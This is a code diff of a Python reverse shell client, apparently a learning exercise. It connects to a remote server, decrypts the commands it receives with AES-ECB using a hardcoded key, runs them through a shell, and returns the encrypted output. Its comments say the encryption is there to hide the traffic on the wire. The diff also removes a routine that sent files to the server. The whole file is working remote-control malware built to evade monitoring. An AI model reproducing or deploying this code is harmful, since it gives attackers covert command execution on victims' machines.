@@ -7,10 +7,15 @@ import sys
 import binascii
 import Padding
 
+# Simple way to encrpt traffic so it cant be seen on the wire
+# Reverse shell using AES ECB
+# NOTE ECB is insecure as it repeats
 password='hello'
 ival=10
 
+#Hash key using sha256 hash convert to binary
 key = hashlib.sha256(password.encode()).digest()
+print(key)
 iv= hex(ival)[2:8].zfill(16)  
 #command is the data we will encrypt ie the plaintext
 
@@ -23,19 +28,6 @@ def decrypt(ciphertext,key, mode):
     return(encobj.decrypt(ciphertext))
 
 
-
-def transfer(s, path):
-    if os.path.exists(path):
-        f = open(path, 'rb')
-        packet = f.read(1024)
-        while len(packet) > 0:
-            s.send(packet)
-            packet = f.read(1024)
-        s.send("DONE".encode())
-    else:
-        s.send("File not found".encode())
-
-
 def connect():
     s = socket.socket()
     #s.connect(("10.174.15.6",8080))
@@ -43,7 +35,9 @@ def connect():
     while True:
         
                 
-        command = s.recv(1024)
+        command = s.recv(4096)
+        plaintext = command
+        print("The command receive encrpted",command)
 
         print("Decypting command")
         plaintext = command
@@ -58,25 +52,28 @@ def connect():
         # See the video above which explains how the subprocess element works
         # A pipe has two endpoints
         CMD = subprocess.Popen(plaintext, shell = True, stdout = subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        # Capture any command errors and send the 
+        #plaintext = CMD.stderr.read().decode() 
+        #Combine the stdout and stderr so we capture all.  That way the program wont break
+        plaintext = CMD.stdout.read().decode() + CMD.stderr.read().decode()
         
-        plaintext = CMD.stdout.read().decode()
         print(plaintext)
         
         #convert byte to string!!!
         
         plaintext = Padding.appendPadding(plaintext,blocksize=Padding.AES_blocksize,mode=0)
-        print("The plain text with padding added",plaintext)
+        print("The  response in plain text with padding added",plaintext)
         #print ("Input data (CMS): "+binascii.hexlify(plaintext.encode()).decode())
 
         ciphertext = encrypt(plaintext.encode(),key,AES.MODE_ECB)
-        print("The command encrypted",ciphertext)        
+        print("The response encrypted",ciphertext)        
         
         
         #Capture the standout and send the output to the server
         #s.send(ciphertext.stdout.read())
         s.send(ciphertext)
-        # Capture any command errors and send the 
-        s.send(ciphertext.stderr.read())
+        print("Waiting")
+   
 
 def main():
     key = hashlib.sha256(password.encode()).digest()
